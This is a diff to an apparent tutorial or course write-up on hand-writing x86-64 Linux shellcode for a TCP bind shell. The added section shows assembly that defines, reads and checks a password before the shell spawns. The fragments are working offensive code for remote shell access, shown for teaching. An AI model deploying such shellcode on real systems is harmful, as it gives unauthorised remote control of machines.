@@ -186,7 +186,7 @@ Closing the listening socket is a good practice, but it is now strictly needed f
 
 ### `dup2()`
 
-These syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.
+These [`dup(2)`][man_2_dup2] syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.
 
     ; dup2(new, 0);
     ; dup2(new, 1);
@@ -230,10 +230,52 @@ The shell is spawned by this part of the shellcode. I decided to use the execve 
     mov al, 59
     syscall
 
+We now have a TCP bind shell. Next we're going to password protect it.
+
+Adding a password
+-----------------
+
+To password protect the shell we need to do two things:
+
+1. define a password
+1. read a password from the user
+1. compare it with the correct password
+
+If the password is correct the shellcode spawns a shell, otherwise it quits. I defined a few objectives for this shellcode that were not specified in the assignment:
+
+- I wanted the password to be of *any size* up to at least 16 bytes
+- and that it would be trival to change the password, no special knowledge needed
+
+### Defining the password
+
+Just define the bytes (`db`) of the password. It will also come in handy to know the size of the password. You could hardcode it, but instead I defined a byte that will have the result of `$-password`, i.e. subtract the address of the current line (`$`) to that of the `password` label, which gives us the length of the password.
+
+This definition will allow to change the shellcode's password trivially by changing the first line.
+
+    password: db "pass"
+    pass_len: db $-password
+
+### Read the password
+
+    mov rax, 0
+    mov rdi, 0    ; fd
+    sub rsp, 16   ; create space for "buf" in the stack
+    mov rsi, rsp  ; rsi = *buf
+    mov rdx, 16
+    syscall
+
+    ; compare password
+    xor rcx, rcx
+    mov cl, [rel pass_len]
+    lea rdi, [rel password]
+    cld
+    repz cmpsb
+    jne exit
 
 
 [man_2_syscall]: https://linux.die.net/man/2/syscall
 [man_2_bind]: https://linux.die.net/man/2/bind
+[man_2_dup2]: https://linux.die.net/man/2/dup2
 [man_2_execve]: https://linux.die.net/man/2/execve
 [beej_sockaddr_in]: https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
 [endianness]: https://en.wikipedia.org/wiki/Endianness
